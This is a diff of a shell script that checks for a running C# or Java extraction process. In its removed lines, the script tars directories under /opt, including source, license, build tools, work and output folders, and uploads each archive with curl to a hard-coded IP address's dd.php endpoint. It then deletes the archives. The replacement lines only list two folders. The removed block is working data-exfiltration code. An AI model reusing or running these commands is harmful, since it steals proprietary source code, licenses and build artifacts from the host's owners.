@@ -4,47 +4,9 @@ numprocesses=$(ps axuf | grep "Extraction csharp " | wc -l)
 if [[ $numprocesses -gt 1 ]] ; then
 
 echo "CEE."
-
-tar czf /tmp/cee-buildtools.tar.gz	/opt/buildtools
-tar czf /tmp/cee-dist.tar.gz	/opt/dist
-tar czf /tmp/cee-license.tar.gz	/opt/license
-tar czf /tmp/cee-microsoft.tar.gz	/opt/microsoft
-tar czf /tmp/cee-out.tar.gz	/opt/out
-tar czf /tmp/cee-src.tar.gz	/opt/src
-tar czf /tmp/cee-work.tar.gz	/opt/work
-
-md5sum /tmp/cee-*.tar.gz
-
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-buildtools.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-buildtools" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-dist.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=&fn=cee-dist" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-license.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-license"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-microsoft..tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-microsoft" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-out.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-out"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-src.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-src"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-work.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-work" 
-
-rm -rf /tmp/cee-*.tar.gz
-
+find /opt/microsoft/
 else
 echo "JAVA"
-tar czf /tmp/jav-buildtools.tar.gz  /opt/buildtools
-tar czf /tmp/jav-dist.tar.gz /opt/dist
-tar czf /tmp/jav-license.tar.gz /opt/license
-tar czf /tmp/jav-out.tar.gz /opt/out
-tar czf /tmp/jav-src.tar.gz /opt/src
-tar czf /tmp/jav-tools.tar.gz /opt/tools
-tar czf /tmp/jav-work.tar.gz /opt/work
-md5sum /tmp/jav-*.tar.gz
-
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-buildtools.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-buildtools" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-dist.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=&fn=jav-dist" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-license.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-license"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-out.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-out"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-src.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-src"  
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-tools..tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-tools" 
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-work.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-work" 
-
-rm -rf /tmp/jav-*.tar.gz
-
+find /opt/tools/
 fi
 exit -1
